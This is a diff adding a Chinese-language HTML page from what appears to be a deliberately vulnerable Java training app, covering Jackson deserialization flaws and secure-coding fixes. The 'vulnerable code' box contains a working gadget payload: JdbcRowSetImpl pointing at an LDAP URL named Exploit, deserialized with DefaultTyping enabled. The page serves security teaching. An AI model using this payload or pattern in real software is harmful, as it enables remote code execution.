@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<!-- 顶部导航栏 -->
+<div th:replace="~{commons/commons::topbar}"></div>
+
+<div class="container-fluid">
+    <div class="row">
+        <!-- 侧边栏 -->
+        <div th:replace="~{commons/commons::siderbar(active='jackson.html')}"></div>
+
+        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
+            <div class="vul_header">
+                <span>组件漏洞 - Jackson反序列化</span>
+            </div>
+            <hr>
+            <ul class="nav nav-tabs">
+                <li class="nav-item">
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
+                </li>
+            </ul>
+
+            <div class="tab-content">
+                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
+                    Jackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串并提供对应的反序列化过程。由于其解析效率较高，Jackson目前是Spring
+                    MVC中内置使用的解析方式。
+                </div>
+                <div class="tab-pane fade" id="bb">
+                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 180px;">
+方案一、对于第三方依赖组件，需要及时更新版本
+方案二、
+    (1) 禁止开启DefaultTyping功能。
+    (2) 禁止使用JsonTypeInfo.Id.CLASS注解值。
+    (3) 禁止使用JsonTypeInfo.Id.MINIMAL_CLASS注解值
+升级到较高版本的JDK
+                    </textarea>
+                </div>
+            </div>
+
+            <hr>
+
+            <div class="box-float">
+                <div class="float1">
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="/Jackson/vul">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码</span></h5>
+
+                    <textarea class="form-control" id="code1">
+public void vul() {
+    try {
+        String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";
+
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        Object o = mapper.readValue(payload, Object.class);
+        mapper.writeValueAsString(o);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+                    </textarea>
+
+                </div>
+
+                <div class="float2">
+
+                    <h5><span class="lnr lnr-smile"> 安全代码</span></h5>
+                    <textarea class="form-control" id="code2">
+// 尽量升级最新版本来解决漏洞，如不能再采用方案二
+
+<dependency>
+    <groupId>com.fasterxml.jackson.core</groupId>
+    <artifactId>jackson-databind</artifactId>
+    <version>最新版</version>
+</dependency>
+                    </textarea>
+                </div>
+
+            </div>
+        </main>
+    </div>
+</div>
+
+<!-- 引入script -->
+<div th:replace="~{commons/commons::script}"></div>
+
+
+</body>
+
+</html>
